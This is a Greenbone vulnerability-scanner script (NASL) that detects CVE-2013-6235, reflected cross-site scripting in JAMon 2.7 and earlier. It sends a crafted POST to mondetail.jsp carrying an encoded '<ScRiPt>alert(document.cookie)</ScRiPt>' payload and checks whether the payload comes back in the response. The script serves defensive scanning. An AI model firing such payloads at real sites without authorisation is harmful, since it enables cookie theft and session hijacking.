# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803799");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2013-6235");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-02-10 15:38:15 +0530 (Mon, 10 Feb 2014)");
  script_name("JAMon Multiple Cross-Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"JAMon is prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request and check whether it is able to read
  cookie or not.");

  script_tag(name:"insight", value:"Input passed via the 'ArraySQL', 'listenertype', and 'currentlistener' POST
  parameters to mondetail.jsp and the 'ArraySQL' POST parameter to jamonadmin.jsp,
  sql.jsp, and exceptions.jsp is not properly sanitised before being returned to
  the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"JAMon (Java Application Monitor) version 2.7 and prior");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://secunia.com/advisories/56570");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/65122");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/124933");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Jan/164");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

jamonPort = http_get_port(default:80);

host = http_host_name(port:jamonPort);

foreach dir (make_list_unique("/", "/jamon", "/monitor", http_cgi_dirs(port:jamonPort)))
{

  if(dir == "/") dir = "";

  jamonReq = http_get(item:string(dir, "/menu.jsp"), port:jamonPort);
  jamonRes = http_keepalive_send_recv(port:jamonPort, data:jamonReq);

  ##  Confirm the application
  if(jamonRes && ('>JAMon' >< jamonRes && ">Manage Monitor page <" >< jamonRes ))
  {
    postdata = "listenertype=value&currentlistener=JAMonBufferListener&" +
               "outputTypeValue=html&formatterValue=%23%2C%23%23%23&buf" +
               "ferSize=No+Action&TextSize=&highlight=&ArraySQL=1--%3E1" +
               "%3CScRiPt%3Ealert%28document.cookie%29%3C%2FScRiPt%3E%3" +
               "C%21--&actionSbmt=Go+%21";

    jamonReq = string("POST ", dir, "/mondetail.jsp HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    jamonRes = http_keepalive_send_recv(port:jamonPort, data:jamonReq);

    if(jamonRes =~ "^HTTP/1\.[01] 200" && "-->1<ScRiPt>alert(document.cookie)</ScRiPt><!--" >< jamonRes &&
       ">JAMon - Monitor Detail" >< jamonRes)
    {
      security_message(port:jamonPort);
      exit(0);
    }
  }
}

exit(99);
